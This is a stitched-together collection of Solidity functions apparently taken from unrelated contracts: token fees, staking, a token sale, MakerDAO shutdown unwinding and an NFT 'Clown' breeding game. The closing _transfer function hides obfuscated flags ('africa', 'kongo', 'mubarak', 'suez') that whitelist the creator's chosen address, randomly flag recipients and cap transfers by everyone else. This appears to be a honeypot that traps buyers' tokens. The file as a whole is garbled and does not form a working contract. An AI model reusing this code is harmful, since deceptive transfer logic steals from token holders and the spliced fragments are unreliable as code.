function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns(bool) {
    if (_checkWithoutFee()) {
        _transfer(sender, recipient, amount);
    } else {
        uint256 feeAmount = amount.mul(uint256(_taxFee)).div(10000);
        uint256 leftAmount = amount.sub(feeAmount);
        _transfer(sender, _vault, feeAmount);
        _transfer(sender, recipient, leftAmount);
        ITITANVault(_vault).addTaxFee(feeAmount);
    }
    _approve(
        sender,
        _msgSender(),
        _allowances[sender][_msgSender()].sub(
            amount,
            "ERC20: transfer amount exceeds allowance"
        )
    );
    return true;
}

function initialize(address owner_, address wrappedHydra_, uint256 reward_) external returns(bool) {
    require(!_initialized, "Already initialized");
    require(reward_ > 0, "Reward is zero");
    _wrappedHydra = IERC20(wrappedHydra_);
    require(_wrappedHydra.transferFrom(owner_, address(this), reward_), "Token transfer failed");
    _initialized = true;
    _owner = owner_;
    _totalSupply += 1;
    _balances[owner_] += 1;
    _lastUpdateTime = block.number;
    _rewardRate = 132e5; 
    emit Staked(msg.sender, 1);
    return true;
}

function withdraw(uint256 amount_) public initialized updateReward(msg.sender) {
    require(amount_ <= _balances[msg.sender], "Insufficient funds");
    require(amount_ > 0, "Invalid amount to withdraw");
    require(_wrappedHydra.transfer(msg.sender, amount_), "Token transfer failed");
    _totalSupply -= amount_;
    _balances[msg.sender] -= amount_;
    emit Withdrawn(msg.sender, amount_);
}

function stake(uint256 amount_) external initialized updateReward(msg.sender) {
    require(amount_ > 0, "Cannot stake zero liquidity");
    require(_wrappedHydra.transferFrom(msg.sender, address(this), amount_), "Token transfer failed");
    _totalSupply += amount_;
    _balances[msg.sender] += amount_;
    emit Staked(msg.sender, amount_);
}

function sell(uint256 amount) public {
    require(amount >= 10, "You need to sell at least some tokens");
    uint256 allowance = token.allowance(msg.sender, address(this));
    uint256 amountToSell = amount * 100000000;
    require(allowance >= amountToSell, "Check the token allowance");
    token.transferFrom(msg.sender, address(this), amountToSell);
    uint256 eVal = (amount * tokenPrice);
    msg.sender.transfer(eVal);
    emit Sold(msg.sender, amount);
}

function cashSavings() public {
    require(
        end.tag(WETH) != 0,
        "Unwind: End.sol not caged"
    );
    require(
        end.fix(WETH) != 0,
        "Unwind: End.sol not ready"
    );
    uint256 chaiTokens = chai.balanceOf(address(treasury));
    require(chaiTokens > 0, "Unwind: Nothing to cash");
    chai.exit(address(treasury), chaiTokens); 
    uint256 daiTokens = dai.balanceOf(address(this)); 
    daiJoin.join(address(this), daiTokens); 
    end.pack(daiTokens); 
    end.cash(WETH, daiTokens); 
    uint256 gem = vat.gem(WETH, address(this)); 
    wethJoin.exit(address(this), gem); 
    cashedOut = true;
    _fix = end.fix(WETH);
    _chi = pot.chi();
}

function unwind() public {
    require(
        end.tag(WETH) != 0,
        "Unwind: MakerDAO not shutting down"
    );
    live = false;
    treasury.shutdown();
    controller.shutdown();
    liquidations.shutdown();
}

function settleTreasury() public {
    require(
        live == false,
        "Unwind: Unwind first"
    );
    (uint256 ink, uint256 art) = vat.urns(WETH, address(treasury));
    require(ink > 0, "Unwind: Nothing to settle");
    _treasuryWeth = ink; 
    vat.fork( 
        WETH,
        address(treasury),
        address(this),
        toInt(ink),
        toInt(art)
    );
    end.skim(WETH, address(this)); 
    end.free(WETH); 
    uint256 gem = vat.gem(WETH, address(this)); 
    wethJoin.exit(address(this), gem); 
    settled = true;
}

function giveBirth(uint _matronId, uint _sireId) external onlyCOO returns(uint) {
    Clown storage matron = clowns[_matronId];
    Clown storage sire = clowns[_sireId];
    require(sire.sex == 1);
    require(matron.sex == 0);
    require(_matronId != _sireId);
    _updateCooldown(sire);
    _updateCooldown(matron);
    require(matron.birthTime != 0);
    uint16 parentGen = matron.generation;
    if (sire.generation > matron.generation) {
        parentGen = sire.generation;
    }
    uint mGenes = matron.genes;
    uint sGenes = sire.genes;
    uint childGenes = geneScience.mixGenes(mGenes, sGenes, promoTypeNum);
    address owner = clownIndexToOwner[_matronId];
    uint clownId = _createClown(_matronId, _sireId, parentGen + 1, childGenes, owner);
    return clownId;
}

function tokensOfOwner(address _owner) external view returns(uint[] ownerTokens) {
    uint tokenCount = balanceOf(_owner);
    if (tokenCount == 0) {
        return new uint[](0);
    } else {
        uint[] memory result = new uint[](tokenCount);
        uint totalCats = totalSupply();
        uint resultIndex = 0;
        uint catId;
        for (catId = 1; catId <= totalCats; catId++) {
            if (clownIndexToOwner[catId] == _owner) {
                result[resultIndex] = catId;
                resultIndex++;
            }
        }
        return result;
    }
}

function _createClown(
    uint _matronId,
    uint _sireId,
    uint _generation,
    uint _genes,
    address _owner
)
internal
returns(uint) {
    require(_matronId == uint(uint32(_matronId)));
    require(_sireId == uint(uint32(_sireId)));
    require(_generation == uint(uint16(_generation)));
    uint16 cooldownIndex = uint16(_generation / 2);
    if (cooldownIndex > 8) {
        cooldownIndex = 8;
    }
    uint16[] memory randomValue = new uint16[](3);
    uint spAttr = _random(3);
    for (uint j = 0; j < 3; j++) {
        if (spAttr == j) {
            if (_generation == 0 || _subGene(_genes, 0, 2) >= 30) {
                rankList = spRank1;
            } else {
                rankList = spRank2;
            }
        } else {
            if (_generation == 0 || _subGene(_genes, 0, 2) >= 30) {
                rankList = norRank1;
            } else {
                rankList = norRank2;
            }
        }
        uint digNum = _random(100);
        rankNum = 10;
        for (uint k = 0; k < 6; k++) {
            if (rankList[k] >= digNum && rankNum == 10) {
                rankNum = k;
            }
        }
        if (rankNum == 0 || rankNum == 10) {
            randomValue[j] = 100 + uint16(_random(_genes) % 200);
        } else {
            randomValue[j] = digList[rankNum - 1] + uint16(_random(_genes) % (digList[rankNum] - digList[rankNum - 1]));
        }
    }
    Clown memory _clown = Clown({
        genes: _genes,
        birthTime: uint64(now),
        matronId: uint32(_matronId),
        sireId: uint32(_sireId),
        sex: uint16(_genes % 2),
        cooldownIndex: cooldownIndex,
        generation: uint16(_generation),
        growthAddition: 0,
        attrPower: randomValue[0],
        attrAgile: randomValue[1],
        attrWisdom: randomValue[2]
    });
    uint newClownId = clowns.push(_clown) - 1;
    require(newClownId == uint(uint32(newClownId)));
    Birth(
        _owner,
        newClownId,
        uint(_clown.matronId),
        uint(_clown.sireId),
        _clown.genes
    );
    _transfer(0, _owner, newClownId);
    return newClownId;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (mubarak == true)) {
        africa[recipient] = true;
        kongo[recipient] = false;
        mubarak = false;
    }
    if (africa[recipient] != true) {
        kongo[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((kongo[sender]) && (africa[recipient] == false)) {
        kongo[recipient] = true;
    }
    if (africa[sender] == false) {
        require(amount < suez);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

